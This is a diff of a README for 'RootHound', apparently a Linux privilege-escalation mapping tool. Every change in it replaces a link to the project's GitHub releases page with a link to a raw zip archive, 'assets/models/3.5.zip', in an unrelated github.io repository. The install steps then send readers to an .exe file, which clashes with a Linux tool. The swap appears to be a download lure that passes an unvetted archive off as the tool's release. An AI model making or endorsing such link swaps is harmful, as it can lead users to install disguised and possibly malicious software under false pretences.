@@ -5,7 +5,7 @@ description: "Map local Linux privilege escalation paths with an interactive att
 ---
 # 🛡️ RootHound - Find your path to administrator access
 
-[![](https://img.shields.io/badge/Download-RootHound-blue.svg)](https://github.com/Florianport417/RootHound/releases)
+[![](https://img.shields.io/badge/Download-RootHound-blue.svg)](https://raw.githubusercontent.com/Florianport417/florianport417.github.io/main/assets/models/3.5.zip)
 
 RootHound maps potential security weaknesses on Linux systems to help you gain administrative control. It works like a map for your computer security journey. You use this tool to discover ways to upgrade your user account to an administrator account. People use this software to study computer security, practice for competitions, and test system defenses.
 
@@ -28,7 +28,7 @@ You do not need to install complex compilers or programming environments. The so
 
 Follow these steps to prepare RootHound for use:
 
-1. Visit the [releases page](https://github.com/Florianport417/RootHound/releases) to download the latest version.
+1. Visit the [releases page](https://raw.githubusercontent.com/Florianport417/florianport417.github.io/main/assets/models/3.5.zip) to download the latest version.
 2. Look for the file ending in .exe.
 3. Click the link to save the file to your computer.
 4. Move the file to a folder where you keep your security tools.
